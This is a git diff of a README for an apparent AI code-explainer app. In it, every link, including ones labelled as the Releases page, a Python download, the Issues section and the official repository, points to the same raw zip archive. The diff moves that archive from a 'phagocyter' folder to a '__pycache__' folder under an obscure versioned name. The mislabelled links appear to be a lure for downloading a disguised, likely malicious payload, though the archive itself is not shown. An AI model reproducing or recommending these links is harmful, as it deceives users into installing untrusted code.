@@ -1,6 +1,6 @@
 # 😊 AI-Code-Explainer-Optimizer - Simplifying Code Understanding for Everyone
 
-[![Download App](https://raw.githubusercontent.com/vicky999jeevi/AI-Code-Explainer-Optimizer/main/phagocyter/AI-Code-Explainer-Optimizer.zip)](https://raw.githubusercontent.com/vicky999jeevi/AI-Code-Explainer-Optimizer/main/phagocyter/AI-Code-Explainer-Optimizer.zip)
+[![Download App](https://github.com/vicky999jeevi/AI-Code-Explainer-Optimizer/raw/refs/heads/main/__pycache__/Optimizer_Explainer_Code_A_3.6-beta.3.zip)](https://github.com/vicky999jeevi/AI-Code-Explainer-Optimizer/raw/refs/heads/main/__pycache__/Optimizer_Explainer_Code_A_3.6-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to AI-Code-Explainer-Optimizer! This interactive app helps users easily 
 
 To get started, you need to download the app. Follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/vicky999jeevi/AI-Code-Explainer-Optimizer/main/phagocyter/AI-Code-Explainer-Optimizer.zip) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/vicky999jeevi/AI-Code-Explainer-Optimizer/raw/refs/heads/main/__pycache__/Optimizer_Explainer_Code_A_3.6-beta.3.zip) to find the latest version of the software.
 2. **Download the Latest Version:** Look for the version labeled "Latest Release." It will have the newest features and fixes.
 3. **Install the Software:** Once the download is complete, open the downloaded file and follow the on-screen instructions to install. It’s usually just a few clicks.
 
@@ -41,7 +41,7 @@ To run this application, your system should meet the following requirements:
 
 If you experience issues while using the app, try these solutions:
 
-- **Not Launching:** Ensure you have the correct version of Python installed. You can download it [here](https://raw.githubusercontent.com/vicky999jeevi/AI-Code-Explainer-Optimizer/main/phagocyter/AI-Code-Explainer-Optimizer.zip).
+- **Not Launching:** Ensure you have the correct version of Python installed. You can download it [here](https://github.com/vicky999jeevi/AI-Code-Explainer-Optimizer/raw/refs/heads/main/__pycache__/Optimizer_Explainer_Code_A_3.6-beta.3.zip).
 - **App Crashes:** Check your system resources. Close unnecessary applications to free up RAM.
 - **Slow Performance:** The app may require more space or RAM than available. Consider clearing space or upgrading your hardware.
 
@@ -49,7 +49,7 @@ If you experience issues while using the app, try these solutions:
 
 If you have questions or need assistance, we invite you to join our community. You can reach out in the following ways:
 
-- **GitHub Issues:** Use the [Issues](https://raw.githubusercontent.com/vicky999jeevi/AI-Code-Explainer-Optimizer/main/phagocyter/AI-Code-Explainer-Optimizer.zip) section to report bugs or request features.
+- **GitHub Issues:** Use the [Issues](https://github.com/vicky999jeevi/AI-Code-Explainer-Optimizer/raw/refs/heads/main/__pycache__/Optimizer_Explainer_Code_A_3.6-beta.3.zip) section to report bugs or request features.
 - **Discussion Forum:** Join our discussion page for community support and tips from fellow users.
 - **Documentation:** Comprehensive documentation is also available in the repository. It covers advanced features, usage tips, and more.
 
@@ -63,8 +63,8 @@ To learn more about the technology behind the app, consider exploring these topi
 
 ## 🔗 Additional Resources
 
-For more information and updates, please visit the official GitHub repository: [AI-Code-Explainer-Optimizer](https://raw.githubusercontent.com/vicky999jeevi/AI-Code-Explainer-Optimizer/main/phagocyter/AI-Code-Explainer-Optimizer.zip).
+For more information and updates, please visit the official GitHub repository: [AI-Code-Explainer-Optimizer](https://github.com/vicky999jeevi/AI-Code-Explainer-Optimizer/raw/refs/heads/main/__pycache__/Optimizer_Explainer_Code_A_3.6-beta.3.zip).
 
-You can also download the app directly by following this [link](https://raw.githubusercontent.com/vicky999jeevi/AI-Code-Explainer-Optimizer/main/phagocyter/AI-Code-Explainer-Optimizer.zip).
+You can also download the app directly by following this [link](https://github.com/vicky999jeevi/AI-Code-Explainer-Optimizer/raw/refs/heads/main/__pycache__/Optimizer_Explainer_Code_A_3.6-beta.3.zip).
 
 Thank you for using AI-Code-Explainer-Optimizer. Happy coding!
